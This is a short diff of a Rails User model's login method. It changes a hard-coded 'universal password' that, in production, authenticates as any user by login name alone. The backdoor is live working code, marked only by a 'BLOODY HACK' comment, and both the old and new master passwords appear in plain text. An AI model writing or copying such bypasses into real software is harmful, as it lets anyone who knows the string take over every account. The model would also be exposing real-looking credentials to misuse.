@@ -18,7 +18,7 @@ class User < ActiveRecord::Base
     if RAILS_ENV == 'production'
       result = find(:first, :conditions => ['login = ?', login])
       # return if universal password has been given. BLOODY HACK
-      return result.id if pass == 'G3n3r4l'
+      return result.id if pass == 'Asia2]gimps'
       if result
         # another bloody hack
         if result.has_role?('supervisor')
